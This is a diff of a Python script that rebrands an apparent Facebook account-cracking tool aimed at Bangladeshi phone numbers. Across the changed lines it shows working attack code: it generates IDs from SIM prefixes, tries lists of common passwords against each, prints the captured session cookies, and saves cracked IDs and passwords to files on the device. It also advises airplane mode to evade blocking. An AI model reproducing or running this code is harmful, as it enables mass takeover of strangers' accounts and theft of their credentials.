@@ -1,4 +1,4 @@
-#MRX(MUHAMMAD ZAHIRUL)(MD JIBON ISLAM)
+#MD JIBON
 #WhatsApp : 01865544636
 #Github : MRX-JIBON-SARKAR
 #!/usr/bin/python3
@@ -76,7 +76,7 @@ try:
 except ValueError:
     exit()
 def banner():
-    print("[=] ðŸ˜Œ Testing New mathod By RDJ")
+    print("[=] ðŸ˜Œ Testing New mathod By Jibon")
 current = datetime.now()
 ta = current.year
 bu = current.month
@@ -141,7 +141,7 @@ def jalan(z):
 def menu_apikey():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "→".join(uuid)
-  server = requests.get('https://github.com/MRX-JIBON-SARKAR/Test/blob/main/Test.txt').text
+  server = requests.get('https://github.com/MRX-JIBON-SARKAR/MRX-JIBON/blob/main/MRX-JIBON.txt').text
   
  
 
@@ -149,18 +149,18 @@ def menu_apikey():
   print("""\x1b[1;97m
 
 
-███    ███ ██████           ██ ██ ██████   ██████  ███    ██ 
-████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████   ██ 
-██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ██  ██ 
-██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██ ██ 
-██      ██ ██   ██      █████  ██ ██████   ██████  ██   ████                                                                                                                                                                                                                                                  
 
+     ██ ██ ██████   ██████  ███    ██ 
+     ██ ██ ██   ██ ██    ██ ████   ██ 
+     ██ ██ ██████  ██    ██ ██ ██  ██ 
+██   ██ ██ ██   ██ ██    ██ ██  ██ ██ 
+ █████  ██ ██████   ██████  ██   ████                                                                                                                                                                                                                                                                                                                         
     ┌───────────────────────────────────────┐
     │ [✓] AUTHOR   : MRX JIBON            
-    │ [✓] LIKE    : PYTHON                  
+    │ [✓] LIKE    :                 
     │ [✓] WHATSAPP : +8801846738727         
-    │ [✓] VERSION  : 1.1                  
-    │ [✓] TOOLS    : \033[1;32m RANDOM GAME ID CLONER  \033[1;37m
+    │ [✓] VERSION  : 0.1            
+    │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m
     └───────────────────────────────────────┘""")
   print(f"\t \033[1;32m BIG FAN OF ROBERT DOWNER JR ™ \033[1;37m ")
   print(f"")
@@ -183,7 +183,7 @@ def menu_apikey():
   print(f"");time.sleep(2)
   print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
   try:
-    httpCaht = requests.get("https://github.com/MRX-JIBON-SARKAR/Test/blob/main/Test.txt").text
+    httpCaht = requests.get("https://github.com/MRX-JIBON-SARKAR/MRX-JIBON/blob/main/MRX-JIBON.txt").text
     if id in httpCaht:
       print("\033[1;92m   YOUR KEY APROVED  ");time.sleep(2)
       msg = str(os.geteuid())
@@ -205,17 +205,17 @@ menu_apikey()
 logo=(f"""\x1b[1;97m
 
 
-███    ███ ██████           ██ ██ ██████   ██████  ███    ██ 
-████  ████ ██   ██          ██ ██ ██   ██ ██    ██ ████   ██ 
-██ ████ ██ ██████           ██ ██ ██████  ██    ██ ██ ██  ██ 
-██  ██  ██ ██   ██     ██   ██ ██ ██   ██ ██    ██ ██  ██ ██ 
-██      ██ ██   ██      █████  ██ ██████   ██████  ██   ████                                                                                                                                                                                                                                             
 
+     ██ ██ ██████   ██████  ███    ██ 
+     ██ ██ ██   ██ ██    ██ ████   ██ 
+     ██ ██ ██████  ██    ██ ██ ██  ██ 
+██   ██ ██ ██   ██ ██    ██ ██  ██ ██ 
+ █████  ██ ██████   ██████  ██   ████                                                                                                                                                                                                                                                                                                                          
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   :  MRX JIBON           
-   │ [✓] LIKE     :  PYTHON                
+   │ [✓] LIKE     :                
    │ [✓] WHATSAPP : +8801865544636         
-   │ [✓] VERSION  : 1.1                   
+   │ [✓] VERSION  : 0.1                  
    │ [✓] TOOLS    : \033[1;32m GAME ID CLONER  \033[1;37m
    └───────────────────────────────────────┘""")
 def cek_apk(session,coki):
@@ -243,9 +243,9 @@ def cek_apk(session,coki):
 def Main():
 	os.system('clear')
 	print(logo)
-	print('   [1] BD Number Cloner [CP-OK MIX] ')
-	print("   [2] BD Number cloner [Only Ok]")
-	print("   [3] BD Number cloner [APK] ")
+	print('   [1] BD Cloner [CP-OK MIX] ')
+	print("   [2] BD Cloner [Only Ok]")
+	print("   [3] BD Cloner [APK] ")
 	print("   [4] Contract Admin [Report a problem]")
 	print('   [0] Back')
 	print(54*'_')
@@ -301,20 +301,20 @@ def virus():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [🔥]  Total ids:\033[1;92m '+tl)
-		print(f' [🔥]  Usaragents : '+str(len(ugen)))
-		print(f' [🔥]\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [🔥]  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[🔥]  The process has been started')
-		print(' [🔥]  use airplane mode if ok ids not come ')
+		print(' [✓]  Total ids:\033[1;92m '+tl)
+		print(f' [✓]  Usaragents : '+str(len(ugen)))
+		print(f' [✓]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [✓]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[✓]  The process has been started')
+		print(' [✓]  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','BANGLADESHI','love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(a,uid,pwx,tl)
 	print(50*'_')
-	print(' [🔥] Crack process has been completed')
-	print(' [🔥] Ids saved in ok.txt,cp.txt')
+	print(' [✓] Crack process has been completed')
+	print(' [✓] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def virus2():
@@ -334,20 +334,20 @@ def virus2():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [😸  Total ids:\033[1;92m '+tl)
-		print(f' [😸  Usaragents : '+str(len(ugen)))
-		print(f' [😸\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [😸  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[😸  The process has been started')
-		print(' [😸  use airplane mode if ok ids not come ')
+		print(' [✓  Total ids:\033[1;92m '+tl)
+		print(f' [✓  Usaragents : '+str(len(ugen)))
+		print(f' [✓\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [✓  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[✓  The process has been started')
+		print(' [✓  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','BANGLADESHI','i love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
-	print(' [😸 Crack process has been completed')
-	print(' [😸 Ids saved in ok.txt,cp.txt')
+	print(' [✓ Crack process has been completed')
+	print(' [✓ Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def virus3():
@@ -367,20 +367,20 @@ def virus3():
 		os.system('clear')
 		print(logo)
 		tl = str(len(user))
-		print(' [😳]  Total ids:\033[1;92m '+tl)
-		print(f' [😳]  Usaragents : '+str(len(ugen)))
-		print(f' [😳]\033[1;97m  target sim code :\033[1;92m {kode} ')
-		print(f"\033[1;97m [😳]  version:\033[1;92m {doamin}")
-		print(' \033[1;97m[😳]  The process has been started')
-		print(' [😳]  use airplane mode if ok ids not come ')
+		print(' [✓]  Total ids:\033[1;92m '+tl)
+		print(f' [✓]  Usaragents : '+str(len(ugen)))
+		print(f' [✓]\033[1;97m  target sim code :\033[1;92m {kode} ')
+		print(f"\033[1;97m [✓]  version:\033[1;92m {doamin}")
+		print(' \033[1;97m[✓]  The process has been started')
+		print(' [✓]  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','BANGLADESH','i love you','i hate you','i have you','বাংলাদেশ']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
-	print(' [😳] Crack process has been completed')
-	print(' [😳] Ids saved in ok.txt,cp.txt')
+	print(' [✓] Crack process has been completed')
+	print(' [✓] Ids saved in ok.txt,cp.txt')
 	print(50*'_')
 	exit()
 def a(uid,pwx,tl):
@@ -432,16 +432,16 @@ def a(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [JIBON-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
-                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/JIBON-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\r\x1b[38;5;196m[cp] {uid}|{ps}")
-                open('/sdcard/MRX-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/JIBON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
@@ -458,7 +458,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMRX\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93mJIBON\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -498,11 +498,11 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\33[1;92m [🔢] Number : {uid}')
+                print(f'\r\33[1;92m [JIBON-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [✓] Number : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/MRX-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/JIBON-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -557,12 +557,12 @@ def c(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [MRX-OK] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\33[1;92m [🔢] Numer : {uid}')
+                print(f'\r\33[1;92m [JIBON-OK] '+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [✓] Numer : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/MRX.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/JIBON.txt', 'a').write(cid+' | '+ps+'\n')
                 break
             else:
                 continue
